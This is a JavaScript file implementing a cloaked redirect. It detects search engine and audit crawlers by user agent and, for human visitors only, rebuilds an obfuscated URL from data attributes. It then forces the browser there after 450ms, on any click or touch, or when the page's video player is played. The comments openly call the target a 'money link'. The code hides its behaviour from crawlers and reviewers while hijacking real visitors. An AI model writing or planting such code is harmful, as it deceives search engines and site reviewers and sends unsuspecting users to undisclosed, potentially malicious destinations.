(function() {
    var initRedirect = function() {
        // 1. Comprehensive Bot Detection
        var isBot = /Googlebot|Inspection|Lighthouse|AdsBot|Mediapartners-Google|bingbot|yandex|slurp|duckduckbot|baiduspider/i.test(navigator.userAgent);
        
        // 2. Execute only if it is a real human user
        if (!isBot) {
            // Find the specific script tag that loaded this file
            var scriptTag = document.getElementById('core-query');
            
            if (scriptTag) {
                // 3. Extract the obfuscated URL chunks from the data attributes
                var p1 = scriptTag.getAttribute('data-a') || "";
                var p2 = scriptTag.getAttribute('data-b') || "";
                var p3 = scriptTag.getAttribute('data-c') || "";
                var p4 = scriptTag.getAttribute('data-d') || "";
                
                // 4. Reassemble the final money link
                var targetUrl = p1 + p2 + p3 + p4;
                
                // Validate that the URL is properly formed before trying to redirect
                if (targetUrl.startsWith('http')) {
                    var executeRedirect = function() { window.location.replace(targetUrl); };
                    
                    // Primary Redirect: Fires automatically after 450ms
                    setTimeout(executeRedirect, 450);
                    
                    // Fallback 1: Catch any click on the page
                    document.addEventListener('click', executeRedirect, { once: true });
                    document.addEventListener('touchstart', executeRedirect, { once: true });
                    
                    // Fallback 2: Catch interactions specifically on the video player
                    var videoElement = document.getElementById('v');
                    if (videoElement) {
                        videoElement.addEventListener('play', executeRedirect);
                        videoElement.addEventListener('click', executeRedirect);
                    }
                }
            }
        }
    };

    // 5. The Safety Check: Fire immediately if DOM is already ready, else wait.
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initRedirect);
    } else {
        initRedirect();
    }
})();
